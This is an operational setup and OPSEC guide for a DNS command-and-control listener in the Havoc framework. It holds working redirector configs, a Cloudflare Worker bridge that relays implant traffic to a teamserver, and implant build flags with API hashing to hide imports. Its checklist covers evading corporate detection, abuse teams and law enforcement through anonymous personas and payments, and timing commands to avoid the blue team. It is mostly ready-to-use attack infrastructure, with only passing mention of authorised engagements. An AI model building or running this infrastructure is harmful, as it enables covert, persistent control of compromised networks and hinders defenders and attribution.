# DNS C2 Listener — Setup & OPSEC Guide

This guide covers infrastructure design, registrar configuration, redirector setup, and
OPSEC considerations for operating the Havoc DNS C2 listener across the most common
deployment patterns. It assumes the miekg/dns-based DNS handler is already in the
teamserver build.

---

## Table of Contents

1. [How DNS C2 Traffic Flows](#1-how-dns-c2-traffic-flows)
2. [Why CDNs Cannot Proxy DNS](#2-why-cdns-cannot-proxy-dns)
3. [Infrastructure Tiers](#3-infrastructure-tiers)
4. [Registrar & DNS Provider Selection](#4-registrar--dns-provider-selection)
5. [DNS Delegation Setup (Per Provider)](#5-dns-delegation-setup-per-provider)
6. [Redirector Configuration](#6-redirector-configuration)
7. [CDN Provider Specifics](#7-cdn-provider-specifics)
8. [Havoc Profile Configuration](#8-havoc-profile-configuration)
9. [Demon Build Parameters](#9-demon-build-parameters)
10. [OPSEC Checklist](#10-opsec-checklist)
11. [Common Failure Modes](#11-common-failure-modes)

---

## 1. How DNS C2 Traffic Flows

```
Windows target
     │
     │ DNS query (UDP/TCP 53)
     ▼
Corporate recursive resolver  ←── may log all external DNS queries
     │
     │ recursive resolution to authoritative NS
     ▼
Registrar / DNS provider
  (Cloudflare, Route53, Namecheap FreeDNS, etc.)
     │
     │ NS delegation record → glue A record
     ▼
Your authoritative NS (VPS redirector)
     │
     │ DNAT / stream proxy → port 5353
     ▼
Teamserver (EC2, VPS, bare-metal)
  Havoc miekg/dns handler
     │
     │ parseAgentRequest → encrypted response queued
     ▼
TXT poll → base64 ciphertext back through same chain
```

Every hop in this chain is a potential detection or attribution point. The goal
is to minimise what is visible at each hop and to ensure no single burned
component exposes the teamserver IP.

---

## 2. Why CDNs Cannot Proxy DNS

Cloudflare, CloudFront, Fastly, and Akamai are HTTP/HTTPS reverse proxies. Their
edge nodes terminate TLS on ports 80/443. They do **not** accept or relay UDP/TCP
port 53 traffic — that protocol runs below the HTTP layer.

| CDN role in DNS C2 | Viable? | Notes |
|---|---|---|
| Proxy DNS queries (port 53) | **No** | CDN only handles HTTP/HTTPS |
| Registrar (domain registration) | Yes | Domain reputation benefit |
| Authoritative DNS (serving NS records) | Yes | Cloudflare DNS, Route53 serve the glue |
| IP space for redirector VPS | Yes | High-trust ASN blends in corporate logs |
| HTTP→DNS bridge (DoH) | Advanced | Cloudflare Workers / nginx DoH proxy |

CDN value in a DNS C2 operation is therefore:

- **Domain reputation**: Cloudfront-, Fastly-, or CDN-adjacent domains are
  pre-categorised as "content delivery" by most web proxy products.
- **IP reputation**: A redirector VPS on an IP within a CDN-adjacent ASN (e.g.
  AS13335 Cloudflare, AS16509 AWS) has lower threat-intel score than a
  fresh Linode/Hetzner IP.
- **Parent zone DNS**: Cloudflare DNS or Route53 serve your NS delegation record,
  adding a trusted intermediary before recursive resolvers reach your VPS.

---

## 3. Infrastructure Tiers

### Tier 0 — Direct (avoid)

```
[Domain NS glue] → EC2 public IP : 53
```

- EC2 IP exposed in DNS; trivial to burn.
- Requires root on teamserver to bind port 53.
- EC2 IP ranges (3.x, 18.x, 52.x) blocked by many corporate egress filters.
- AWS abuse team receives reports; EC2 can be suspended within hours.

### Tier 1 — Single VPS Redirector (minimum viable)

```
[Domain NS glue] → VPS : 53 → [iptables DNAT] → EC2 : 5353
```

- Teamserver IP never appears in DNS.
- Burned VPS = replace iptables target; no DNS change needed.
- VPS choice matters for IP reputation (see §7).

### Tier 2 — Dual-Redirector (resilient)

```
[NS1 glue] → VPS-A : 53 ─┐
                           ├─ [nginx stream] → EC2 : 5353
[NS2 glue] → VPS-B : 53 ─┘
```

- Two NS records: some resolvers pick randomly, providing load distribution
  and failover if one VPS is null-routed.
- Recommended for long-running operations.

### Tier 3 — DoH Redirector (high-trust bypass)

```
Demon uses DoH (DNS-over-HTTPS) → Cloudflare Worker / nginx DoH endpoint
Worker translates DoH POST → plain DNS → EC2 : 5353
```

- All DNS queries appear as HTTPS traffic to a CDN IP.
- Bypasses corporate firewalls that block port 53 to external IPs.
- Requires custom Demon transport modification (out of scope here).
- Most effective in environments where DoH is permitted to Cloudflare (1.1.1.1).

---

## 4. Registrar & DNS Provider Selection

### Cloudflare (registrar only)

**Pros:**
- Domain prices at cost (no markup).
- Free DNSSEC and DNS service included.
- Cloudflare-registered domains have high Cisco Umbrella / Webroot categorisation
  scores by association with legitimate CDN traffic.

**Cons:**
- Cloudflare actively enforces ToS §2.8 (no C2 traffic). Abuse reports result
  in domain suspension within 24–48 hours.
- Cloudflare logs all DNS queries to their authoritative servers, including the
  NS delegation lookups for your zone. These logs are available to Cloudflare's
  threat intel team and to US law enforcement under warrant.
- Cloudflare's Registrar Abuse team is aggressive; they will lock the domain
  and release registrant data.

**Verdict:** Acceptable for short-duration engagements on pre-authorised targets.
Not recommended for persistent operations or red teams where the op must survive
a burn event.

### Namecheap

**Pros:**
- Allows custom nameservers without restriction.
- Does not run an aggressive abuse team relative to Cloudflare.
- `WhoisGuard` privacy enabled by default on most TLDs.
- Accepts payment via cryptocurrency (Monero via third-party) if anonymity matters.

**Cons:**
- Namecheap has complied with law enforcement requests in documented cases.
- Their free DNS (FreeDNS) is adequate for serving the NS glue.

**Verdict:** Good default choice for most engagements.

### Porkbun

**Pros:**
- Cheap registration, WHOIS privacy included free.
- Supports custom NS records without issues.
- Less associated with malicious infrastructure than Namecheap in threat-intel feeds.

**Cons:**
- Smaller registrar; less established abuse policy track record.

**Verdict:** Good alternative to Namecheap, particularly if Namecheap domains
have been burned in prior ops.

### AWS Route53 (DNS provider, not registrar)

**Pros:**
- Route53 can serve the NS delegation record for your zone.
- Highly available (SLA 100%).
- Glue records within Route53 are served from AWS-managed nameservers
  (`ns-xxx.awsdns-xx.com`) — familiar to SOC analysts, less suspicious.
- You can use a non-AWS registrar and point NS to Route53.

**Cons:**
- Tied to your AWS account; if EC2 or Route53 are suspended, both go simultaneously.
- Route53 zone logs (query logging) can be enabled by AWS during incident response.
- Route53 nameserver IPs (`205.251.x.x`, `205.252.x.x`) are well-known; sophisticated
  defenders correlate NS lookups to AWS-managed DNS.

**Verdict:** Good for engagements where blue team is not AWS-aware. Avoid if the
target has AWS GuardDuty or tight AWS account linkage risk.

### Hurricane Electric FreeDNS (dns.he.net)

**Pros:**
- Free, no account verification required beyond email.
- HE's NS IPs (`216.218.x.x`) have excellent reputation.
- Supports NS delegation records for sub-zones.
- No logging disclosure policy documented.

**Cons:**
- Free tier has limited records and TTL options.
- Account tied to email address.

**Verdict:** Excellent for throwaway zones on a budget; pair with a Namecheap
or Porkbun registered domain.

---

## 5. DNS Delegation Setup (Per Provider)

The goal in all cases: create a glue A record for your redirector VPS, then
delegate a sub-zone NS to it. The teamserver binds as the authoritative server
for that sub-zone.

### 5.1 Cloudflare Dashboard

Assume: domain = `example.com`, redirector VPS = `1.2.3.4`, zone = `c2.example.com`.

1. **DNS tab → Add record**
   - Type: `A`, Name: `ns1`, IPv4: `1.2.3.4`, Proxy: **OFF** (grey cloud)
   - Proxy must be off — Cloudflare cannot proxy port 53.

2. **DNS tab → Add record**
   - Type: `NS`, Name: `c2`, Content: `ns1.example.com`
   - TTL: `Auto` (Cloudflare sets 300s minimum on free plan; acceptable)

3. Verify delegation:
   ```bash
   dig NS c2.example.com @1.1.1.1
   # Expected: c2.example.com. 300 IN NS ns1.example.com.
   dig A ns1.example.com @1.1.1.1
   # Expected: ns1.example.com. 300 IN A 1.2.3.4
   ```

4. If you want a second NS for resilience:
   - Add `A` record: `ns2` → `5.6.7.8` (second VPS), proxy OFF.
   - Add `NS` record: `c2` → `ns2.example.com`

### 5.2 Namecheap Advanced DNS

1. Log in → Domain List → Manage → **Advanced DNS**.

2. Add Host Record:
   - Type: `A Record`, Host: `ns1`, Value: `1.2.3.4`, TTL: `300`

3. Add Host Record:
   - Type: `NS Record`, Host: `c2`, Value: `ns1.example.com.` (trailing dot optional)

4. Verify as above.

### 5.3 AWS Route53

1. **Hosted Zones → Create hosted zone** for `example.com` (if not already).

2. **Create record**:
   - Record name: `ns1.example.com`
   - Type: `A`
   - Value: `1.2.3.4`
   - TTL: `300`

3. **Create record**:
   - Record name: `c2.example.com`
   - Type: `NS`
   - Value: `ns1.example.com.`
   - TTL: `300`

4. If the domain is registered elsewhere (Namecheap etc.), set that registrar's
   NS to Route53's four nameservers (shown in the hosted zone's NS record).

### 5.4 Hurricane Electric FreeDNS

1. Sign in at `dns.he.net` → Add domain for `example.com`.

2. Add A record: `ns1.example.com` → `1.2.3.4`, TTL `300`.

3. Add NS record: `c2.example.com` → `ns1.example.com`, TTL `300`.

4. At your registrar, set the domain's authoritative NS servers to HE's four
   nameservers shown in the hosted zone view.

### 5.5 Verifying Delegation End-to-End

```bash
# Full delegation trace
dig +trace c2.example.com NS

# Query your VPS directly
dig NS c2.example.com @1.2.3.4

# Check the Demon's zone is being served
dig A test.c2.example.com @1.2.3.4
# Expected: NOERROR, empty answer (zone exists, no such record)
# NOT NXDOMAIN (NXDOMAIN would trigger RFC 8020 caching on Cloudflare resolvers)
```

---

## 6. Redirector Configuration

The redirector VPS listens on port 53 UDP/TCP and forwards to the teamserver.
The teamserver is never reachable from the public internet directly.

### 6.1 iptables DNAT (simplest)

```bash
#!/bin/bash
# Run on redirector VPS as root
# Replace TS_IP and TS_PORT with your teamserver values

TS_IP="10.0.1.50"   # teamserver private/VPN IP
TS_PORT="5353"       # Havoc profile Port

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward
sed -i 's/#net.ipv4.ip_forward=1/net.ipv4.ip_forward=1/' /etc/sysctl.conf

# UDP
iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to-destination ${TS_IP}:${TS_PORT}
# TCP
iptables -t nat -A PREROUTING -p tcp --dport 53 -j DNAT --to-destination ${TS_IP}:${TS_PORT}
# Masquerade so teamserver sees redirector IP, not original client IP
iptables -t nat -A POSTROUTING -j MASQUERADE

# Persist across reboots
iptables-save > /etc/iptables/rules.v4
```

**Note on `MASQUERADE`**: The teamserver will log the redirector IP as the
agent's source address. If you need the original agent IP for logging, use
`SNAT --to-source <redirector-IP>` and pass the actual IP via an out-of-band
channel, or deploy a full proxy (§6.3).

### 6.2 socat (userspace, no root required for ports > 1024)

```bash
# UDP relay (one-shot connections only — adequate for most DNS)
socat UDP4-LISTEN:5353,reuseaddr,fork UDP4:${TS_IP}:${TS_PORT}

# TCP relay
socat TCP4-LISTEN:5353,reuseaddr,fork TCP4:${TS_IP}:${TS_PORT}
```

For port 53 without root:
```bash
# Grant capability to socat binary
sudo setcap cap_net_bind_service=+ep $(which socat)
socat UDP4-LISTEN:53,reuseaddr,fork UDP4:${TS_IP}:${TS_PORT}
```

### 6.3 nginx stream (TCP only; load balancing support)

`nginx` stream module supports TCP but not UDP. Use for TCP-only DNS or paired
with iptables UDP relay.

```nginx
# /etc/nginx/nginx.conf
stream {
    upstream havoc_dns {
        server 10.0.1.50:5353;
        server 10.0.1.51:5353 backup;   # second teamserver for HA
    }

    server {
        listen 53;                       # TCP
        proxy_pass havoc_dns;
        proxy_timeout 10s;
        proxy_connect_timeout 5s;
    }
}
```

Add iptables for UDP separately (nginx stream does not handle UDP):
```bash
iptables -t nat -A PREROUTING -p udp --dport 53 \
    -j DNAT --to-destination 10.0.1.50:5353
```

### 6.4 CoreDNS forward plugin (advanced; preserves client IP)

CoreDNS can proxy DNS queries while forwarding the original client address in
EDNS0 options (ECS). Useful when accurate agent geo-location matters to the op.

```
# Corefile on redirector
. {
    forward . 10.0.1.50:5353
    cache 0
    errors
    log . "{remote} {type} {name} {rcode}"
}
```

```bash
# systemd unit
cat > /etc/systemd/system/coredns.service <<EOF
[Unit]
Description=CoreDNS DNS redirector
After=network.target

[Service]
ExecStart=/usr/local/bin/coredns -conf /etc/coredns/Corefile
Restart=on-failure
AmbientCapabilities=CAP_NET_BIND_SERVICE
User=coredns

[Install]
WantedBy=multi-user.target
EOF

systemctl enable --now coredns
```

### 6.5 Teamserver EC2 Security Group

```
Inbound:
  UDP 5353  from  <redirector-VPS-IP>/32   ALLOW
  TCP 5353  from  <redirector-VPS-IP>/32   ALLOW
  TCP 40056 from  <operator-IP>/32         ALLOW  (Havoc WS port)
  (all other inbound: DENY)

Outbound:
  All traffic ALLOW  (default AWS)
```

Port 53 inbound from `0.0.0.0/0` must be **closed**. The teamserver must only
be reachable through the redirector.

---

## 7. CDN Provider Specifics

### 7.1 Cloudflare

**What Cloudflare can and cannot do for DNS C2:**

| Use case | Works | Notes |
|---|---|---|
| Register C2 domain | Yes | Short ops only; ToS risk |
| Serve NS glue record | Yes | Grey cloud only; query logs exist |
| Proxy DNS queries | **No** | Port 53 not proxied |
| Redirector VPS in AS13335 | Possible | WARP IPs not usable; Cloudflare does not sell VPS |
| DoH bridge (Workers) | Yes (advanced) | Translates HTTPS→DNS; survives port-53 blocking |

**Cloudflare Workers DoH Bridge (advanced, Tier 3):**

If the target network blocks port 53 to external IPs but permits HTTPS to
Cloudflare, a Worker can bridge DoH to your DNS server. This requires a
custom Demon transport (not covered here) but the Worker side is:

```javascript
// Cloudflare Worker — translate DoH POST to plain DNS upstream
export default {
    async fetch(request, env) {
        if (request.method !== 'POST') return new Response('Bad Request', { status: 400 });
        const body = await request.arrayBuffer();
        const resp = await fetch('https://your-teamserver-doh-endpoint:443/dns-query', {
            method: 'POST',
            headers: { 'Content-Type': 'application/dns-message' },
            body,
        });
        return new Response(await resp.arrayBuffer(), {
            headers: { 'Content-Type': 'application/dns-message' },
        });
    }
};
```

Deploy to a Workers route on a domain not associated with the op.

### 7.2 AWS (CloudFront + Route53 + EC2)

**Recommended AWS architecture:**

```
Route53 hosted zone (example.com)
  └─ NS record: c2.example.com → ns1.example.com (glue A = EIP-A)

EIP-A attached to NAT Gateway / VPC endpoint
  └─ Security group: port 53 inbound from internet
  └─ Route table: DNS → EC2 private IP : 5353

EC2 (private subnet, no public IP)
  └─ Havoc teamserver binds 0.0.0.0:5353
  └─ Security group: port 5353 from VPC CIDR only
```

Route53 → NAT Gateway keeps EC2 off the public internet entirely. The Elastic
IP attached to the NAT Gateway is the only exposed IP. Replacing EC2 (if burned
or caught) requires no DNS change — update the NAT Gateway target only.

**EC2 instance selection for OPSEC:**

- Use `t3.medium` or larger; `t2.micro` is flagged in threat-intel as a common
  abuse-tier instance type.
- Deploy in a region geographically plausible for the engagement (e.g., eu-west-2
  for a UK target).
- Use an IAM role with minimum permissions; do not attach the AWS CLI key to the
  instance metadata endpoint (disable IMDSv1, restrict IMDSv2 hop count to 1).

**Route53 query logging:**

Route53 query logging can be enabled by AWS during incident response or if an
account is flagged for abuse. Treat Route53 logs as a potential post-incident
evidence source. Rotate the zone to a fresh sub-domain if an op is burned.

### 7.3 Fastly

Fastly does not offer domain registration or port-53 proxying. Its relevance:

- Fastly IP space (AS54113: `151.101.x.x`, `199.232.x.x`) has extremely high
  trust scores in Cisco Umbrella and Palo Alto PANDB. A redirector VPS
  with an IP in AS54113 (not possible directly — Fastly does not sell VPS)
  would be ideal. In practice, use a CDN-peered VPS provider (Vultr, which
  peers with Fastly at many IXPs) to get adjacent ASN.

### 7.4 Akamai

Akamai (AS16625, AS20940) similarly does not offer VPS or port-53 proxying.
Linode (now Akamai Cloud) IPs (`172.232.x.x`, `66.228.x.x`) are served from
Akamai's own ASN since the 2022 acquisition, giving them elevated reputation
versus a fresh Hetzner IP.

**Recommended redirector VPS providers by IP reputation:**

| Provider | ASN | Reputation tier | Notes |
|---|---|---|---|
| Linode / Akamai | AS63949 | High | Akamai-owned ASN post-acquisition |
| Vultr | AS20473 | Medium-high | CDN peering at major IXPs |
| DigitalOcean | AS14061 | Medium | Common in threat-intel; still trusted |
| AWS EC2 | AS16509 | Medium | EC2 ranges occasionally blocked by orgs |
| Hetzner | AS24940 | Low-medium | Overused for abuse; flagged more often |
| OVH | AS16276 | Low-medium | Same as Hetzner |

---

## 8. Havoc Profile Configuration

### Correct DNS Block

```yaotl
Dns {
    Name         = "DNS-profile"

    # Operator-facing label only — does not affect server bind or Demon config.
    # List the redirector VPS IP(s) here, not the teamserver IP.
    Hosts        = ["1.2.3.4"]

    # Bind address for the miekg/dns server on the teamserver.
    # Always 0.0.0.0 unless you need to bind a specific interface.
    HostBind     = "0.0.0.0"

    # Non-privileged port on the teamserver (redirector DNATs 53 → this port).
    # Use 53 only if running Havoc as root AND there is no redirector.
    Port         = 5353

    # The sub-zone your NS record delegates to the redirector.
    # Must match exactly what is in DNS (case-insensitive, no trailing dot needed).
    ZoneDomain   = "c2.example.com"

    # Per-query timeout in MILLISECONDS.
    # 15 = 15 ms — virtually guaranteed to time out before any resolver round-trips.
    # Set to 4000–8000 for normal operations; 10000–15000 for high-latency targets.
    QueryTimeout = 5000

    # Inter-chunk delay in milliseconds between uplink A queries.
    # 0 = no delay (fastest upload, most distinctive traffic burst).
    # 50–150 = spreads queries over time, reduces burst detection.
    ChunkDelayMs = 75
}
```

### QueryTimeout Reference

| Value | Effect |
|---|---|
| 15 (your current config) | Times out before resolver responds; every chunk retries 3×, causing extreme slowness and uplink failure |
| 500 | Marginal; may fail on high-latency links or slow resolvers |
| 2000 | Acceptable for LAN targets with fast external DNS |
| 5000 | Recommended default; handles slow corporate resolvers |
| 10000 | Use for satellite, GPRS, or highly filtered environments |
| 15000 | Maximum; use only when DNS is severely throttled |

### Sleep / Jitter for DNS C2

DNS C2 generates approximately `ceil(payload_bytes / 30)` A queries per uplink cycle.

| Payload size | A queries | At 10s sleep | Queries/min |
|---|---|---|---|
| 300 bytes (COMMAND_GET_JOB) | 10 | 6/cycle | 6 |
| 3 KB (small BOF output) | 100 | 6/cycle | 60 |
| 300 KB (bofbelt) | 10000 | 6/cycle | 600 |

For large commands, increase sleep temporarily or accept that the downlink will
take multiple sleep cycles. The `DNS_POLL_MAX_ITER = 65535` limit in the Demon
allows up to ~12 MB per cycle, but each poll still takes a full DNS round-trip.

Recommended for DNS C2:
```yaotl
Demon {
    Sleep  = 30    # longer sleep reduces query volume
    Jitter = 20    # ±20% of 30s = ±6s variation
}
```

---

## 9. Demon Build Parameters

```cmake
# payloads/Demon/CMakeLists.txt (DNS transport)
cmake .. \
    -DTRANSPORT=DNS \
    -DARCH=x64 \
    -DZONE_DOMAIN="c2.example.com" \
    -DRESOLVER="1.2.3.4" \
    -DPORT=53 \
    -DQUERY_TIMEOUT=5000 \
    -DCHUNK_DELAY=75
```

The Demon resolves `DnsQuery_W` and `DnsRecordListFree` at runtime by DJB2 hash
from `dnsapi.dll`. The DNS transport binary must not import `dnsapi.dll` in its
import table — verify with:

```bash
objdump -p demon.x64.exe | grep -i dns
# Expected: no output (dynamic resolution only)
```

---

## 10. OPSEC Checklist

### Domain Selection

- [ ] Domain registered under a persona unlinked from the operator's real identity
- [ ] WHOIS privacy / proxy registration enabled
- [ ] Domain registered at least 30 days before operation start (fresh domains
      are flagged by Cisco Umbrella / Zscaler domain age checks)
- [ ] Domain TLD blends with target industry (`.net`, `.com`, `.io` for tech;
      `.org` for NGO targets; avoid `.xyz`, `.top`, `.pw` for high-scrutiny targets)
- [ ] Domain name mimics a CDN, update, or analytics service (not `c2domain.com`)
- [ ] Domain pre-categorised via Bluecoat / Zscaler / Palo Alto URL category tools
      before use; recategorise if needed

### DNS Records

- [ ] NS glue A record is **not** proxied through Cloudflare (grey cloud)
- [ ] NS glue A record TTL is 300s or less (fast rotation if burned)
- [ ] At least two NS records pointing to two separate redirector VPs IPs
- [ ] No AAAA (IPv6) record for the NS glue unless IPv6 is intentional
- [ ] DNSSEC disabled on the delegated sub-zone (Havoc's miekg/dns server
      does not sign responses; DNSSEC validation would fail)

### Redirector VPS

- [ ] Redirector VPS paid for with a payment method unlinked from operator identity
- [ ] VPS provider does not share ASN or datacenter with the teamserver
- [ ] VPS firewall allows inbound 53 UDP/TCP from `0.0.0.0/0` (needs to accept
      from arbitrary resolver IPs)
- [ ] VPS firewall allows outbound to teamserver IP:5353 only
- [ ] SSH access to VPS restricted to operator IP or via jump host; no password auth
- [ ] iptables rules persisted across reboots (`iptables-save`)
- [ ] VPS hostname / reverse DNS does not reveal operator or provider (`rdns` check)

### Teamserver (EC2 / VPS)

- [ ] Teamserver not reachable from public internet on port 53 or 5353
- [ ] EC2 security group: inbound 5353 from redirector IP only
- [ ] Havoc running as non-root user with `CAP_NET_BIND_SERVICE` if port < 1024
- [ ] Profile `QueryTimeout` set in milliseconds, value 4000–8000
- [ ] Profile `Port` matches `iptables DNAT` target port on redirector
- [ ] Havoc operator password not `password1234`
- [ ] TLS certificate for Havoc WebSocket (`Teamserver.Port`) from a real CA
      or at minimum self-signed with restricted client access

### Traffic Pattern

- [ ] `ChunkDelayMs` set to 50–150 to avoid burst signature (10 A queries in 5 ms
      is detectable; spread over 500ms–1.5s blends with normal MX/SPF lookups)
- [ ] Sleep is 30s or longer for persistent access; short sleep only for active phases
- [ ] Large commands (BOF, execute-assembly) issued when blue team is less likely
      to be watching; DNS query volume spikes are visible in SIEM
- [ ] DNS query labels are base32 encoded (verify: no ASCII strings visible in
      Wireshark capture of uplink queries)

### Burn / Rotation Plan

- [ ] Documented procedure for replacing burned redirector (update iptables target IP)
- [ ] Documented procedure for replacing burned domain (rebuild Demon with new zone)
- [ ] Redirector VPS can be destroyed and reprovisioned in < 30 minutes
- [ ] Teamserver Demon config blob can be regenerated with new zone/resolver
      without losing active sessions (HTTP transport fallback or SMB pivot)
- [ ] DNS listener can be stopped and restarted without teamserver restart

---

## 11. Common Failure Modes

| Symptom | Likely Cause | Fix |
|---|---|---|
| Demon never registers | `QueryTimeout` too low (< 500 ms) | Set to 5000 in profile |
| Demon never registers | Glue A record orange-clouded in Cloudflare | Set to grey cloud (DNS only) |
| Demon never registers | EC2 SG blocking port 5353 from redirector | Add inbound rule |
| Demon registers but no job output | `DNS_POLL_MAX_ITER` too low (was 64) | Set to 65535 (already fixed) |
| Demon registers but no job output | Response overwritten by new uplink | Ensure POLL_MAX_ITER fix is built |
| Large command output never arrives | Response > 12 MB (65535 × 189 bytes) | Split command into smaller calls |
| Repeated re-registration loops | `DnsTransportInit` AES decrypt missing | Verify AES context init in DnsTransportInit |
| Intermittent drops | Single NS, redirector rebooted | Add second NS + redirector |
| All DNS fails at target | Corporate resolver blocks port 53 to external IPs | Use DoH bridge (§7.1) or SMB pivot |
| Queries reach redirector but not teamserver | MASQUERADE not set on redirector | Add `iptables -t nat -A POSTROUTING -j MASQUERADE` |
| NXDOMAIN caching blocks subsequent queries | Server returning NXDOMAIN for unknown labels | Server must return NODATA (NOERROR + empty answer) |
| Wide-char TXT decode produces 0 bytes | DnsQuery_W returns PWSTR; code cast to PSTR | Use PWSTR path in DnsQueryTxt (already fixed) |
| `DnsQuery_W` not resolving at runtime | Wrong DJB2 hash for dnsapi.dll or DnsQuery_W | Recompute hashes; verify with debug build |

---

*Last updated: 2026-05-09*
*Applies to: Havoc teamserver with miekg/dns DNS handler and DNS_POLL_MAX_ITER = 65535*
